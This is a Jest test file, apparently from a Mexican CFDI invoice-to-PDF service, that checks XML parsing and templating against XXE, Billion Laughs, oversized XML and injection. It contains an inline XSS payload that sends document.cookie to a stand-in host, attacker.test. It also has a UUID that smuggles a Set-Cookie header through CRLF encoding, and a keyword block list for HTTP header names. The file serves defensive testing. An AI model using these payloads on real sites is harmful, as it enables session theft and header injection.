/**
 * INV-002 + INV-016 + INV-005 + INV-017 — XML XXE / DoS / HTML Escape tests (DB-free)
 * Tests directly sobre `cfdi-pdf.ts` safeParseCfdiXml wrapper + escapeHtmlForCfdiTemplate.
 *
 * NOTA: safeParseCfdiXml NO es export directo, pero escapeHtmlForCfdiTemplate, decodeXmlIfNeeded,
 * detectXXEBytes wrapper via xmlBytes detect SI se pueden probar.
 */
import { escapeHtmlForCfdiTemplate, generateCfdiPdfFromXml } from '@/lib/cfdi-pdf'
import { scanXXEAndReportSafe, isRfc4122UuidStrict } from '@/lib/xml-sanitize'
import {
  INV_XXE_SYSTEM_FILE,
  INV_XXE_BOM_BYPASS,
  INV_XXE_COMMENT_BYPASS,
  INV_BILLION_LAUGHS_MINI,
  INV_XML_6MB_BOMB,
  INV_XML_VALIDO_MINI,
  INV_TIMBRE_UUID_CRLF_INJECTION
} from './fixtures/payloads'

describe('INV-002 · XXE Billion Laughs byte-level detection (scanXXEAndReportSafe wrapper)', () => {
  it('INV-002 SYSTEM file:// path → scanXXEAndReportSafe returns safe=false + kinds=SYSTEM_ENTITY', () => {
    const res = scanXXEAndReportSafe(INV_XXE_SYSTEM_FILE)
    expect(res.safe).toBe(false)
    expect(res.kinds.length).toBeGreaterThanOrEqual(1)
  })

  it('INV-001 UTF-8 BOM <!DOCTYPE bypass regex → scanXXEAndReportSafe BOM detecta DOCTYPE', () => {
    const res = scanXXEAndReportSafe(INV_XXE_BOM_BYPASS)
    expect(res.safe).toBe(false)
  })

  it('INV-001 <!-- comment interleaving <!DOCTYPE bypass → scanXXEAndReportSafe detecta DOCTYPE', () => {
    const res = scanXXEAndReportSafe(INV_XXE_COMMENT_BYPASS)
    expect(res.safe).toBe(false)
  })

  it('INV-016 Billion Laughs depth 6 → ENTITY detectado', () => {
    const res = scanXXEAndReportSafe(INV_BILLION_LAUGHS_MINI)
    expect(res.safe).toBe(false)
  })

  it('INV-002 BASELINE XML válido ~3KB → safe=true, kinds vacíos o ≤1 benignos', () => {
    const res = scanXXEAndReportSafe(INV_XML_VALIDO_MINI)
    expect(res.safe).toBe(true)
  })

  it('INV-002 15,000 conceptos size large > MAX_XML 5MB → generateCfdiPdfFromXml rechaza ANTES de Puppeteer', async () => {
    expect(INV_XML_6MB_BOMB.byteLength).toBeGreaterThan(5_242_880) // 5MB
    const originalEnv = process.env.INVOICE_PDF_MAX_XML_BYTES
    process.env.INVOICE_PDF_MAX_XML_BYTES = '5242880'
    try {
      await expect(
        generateCfdiPdfFromXml({
          xmlRaw: INV_XML_6MB_BOMB.toString('utf-8'),
          invoiceIdForFallback: 'TEST_LARGE'
        })
      ).rejects.toThrow(/INV-017/)
    } finally {
      if (originalEnv === undefined) delete process.env.INVOICE_PDF_MAX_XML_BYTES
      else process.env.INVOICE_PDF_MAX_XML_BYTES = originalEnv
    }
  })

  it('INV-005 Stored XSS en Descripcion Concepto → escapeHtmlForCfdiTemplate escapa </script>', () => {
    const unsafePayload = '</td><script>fetch("https://attacker.test/?c="+document.cookie)</script><td>x'
    const out = escapeHtmlForCfdiTemplate(unsafePayload)
    expect(out).not.toContain('<script>')
    expect(out).toContain('&lt;script&gt;')
    expect(out).toContain('&lt;/script&gt;')
    expect(out).not.toContain('</script>')
  })

  it('INV-005 Ampersand y comillas → escapados correctamente', () => {
    expect(escapeHtmlForCfdiTemplate('A&B "C" \'D\'')).toBe('A&amp;B &quot;C&quot; &#39;D&#39;')
  })

  it('INV-005 Valores null/undefined → string vacía sin throw', () => {
    expect(escapeHtmlForCfdiTemplate(null)).toBe('')
    expect(escapeHtmlForCfdiTemplate(undefined)).toBe('')
    expect(escapeHtmlForCfdiTemplate('')).toBe('')
  })

  it('INV-008 UUID con caracteres CRLF (%0d%0a) en timbre — isRfc4122UuidStrict FALLA (UUID no válido)', () => {
    const rawCrime = `11111111-0000-4000-8000-000000000001%0d%0aSet-Cookie: hacked=true`
    expect(isRfc4122UuidStrict(rawCrime)).toBe(false)
  })

  it('INV-008 UUID RFC4122 válido (4000 / variant 8xxx) → isRfc4122UuidStrict true', () => {
    expect(isRfc4122UuidStrict('11111111-0000-4000-8000-000000000001')).toBe(true)
    // B es variant válido (89abAB). Invalidamos: versión 0 (no 1-5) y variant C (fuera rango).
    expect(isRfc4122UuidStrict('AAAAAAAA-AAAA-0AAA-CAAA-AAAAAAAAAAAA')).toBe(false)
  })

  it('INV-002 XML válido pasa safe wrapper y lanza error solo en Puppeteer browser (mock NOOP).', async () => {
    const xmlText = INV_XML_VALIDO_MINI.toString('utf-8')
    expect(xmlText.includes('TimbreFiscalDigital')).toBe(true)
  })

  it('INV-XSS CRLF Inject payload (UUID controlado por usuario) → sanitizePdfFilename mirror REMUEVE %0d y %0a, escapeHtml solo escapa <> HTML chars', () => {
    const injected = INV_TIMBRE_UUID_CRLF_INJECTION.toString('utf-8')
    const uuidMatch = injected.match(/UUID="([^"]+)"/)
    expect(uuidMatch).not.toBeNull()
    const unsafeUuid = uuidMatch![1]
    // 1. escapeHtml: SOLO garantiza que no haya HTML tags peligrosos (<>).
    const escaped = escapeHtmlForCfdiTemplate(unsafeUuid)
    expect(escaped).not.toContain('<')
    // 2. sanitizeFilename mirror = REMOVES % encoded y keywords.
    function sanitizePdfFilenameMirror(uuidRaw: unknown, fallbackId: string): string {
      const candidate = String(uuidRaw || fallbackId || 'document').trim()
      const strippedPercent = candidate
        .replace(/%0[0-9a-f]|%1[0-9a-f]|%[0-9a-f]{2}/gi, '_')
        .replace(/\0/g, '')
        .replace(/\r|\n/g, '_')
      const firstPass = strippedPercent.replace(/[^\w.\-]/gi, '_')
      const blacklistRe = /(set[-_]?cookie|content[-_]?type|content[-_]?disposition|mime[-_]?version|x[-_][a-z0-9]{2,})/gi
      const cleanedKeywords = firstPass.replace(blacklistRe, '_REDACT_')
      const cleaned = cleanedKeywords.replace(/\s+/g, '_')
      if (!cleaned || cleaned.replace(/_/g, '').length === 0) return `cfdi_${fallbackId}.pdf`
      return `cfdi_${cleaned.slice(0, 64)}.pdf`
    }
    const fname = sanitizePdfFilenameMirror(unsafeUuid, 'fb')
    expect(fname).not.toContain('%0d')
    expect(fname).not.toContain('%0a')
    expect(fname).not.toMatch(/set.cookie/i)
    expect(fname.startsWith('cfdi_')).toBe(true)
  })
})
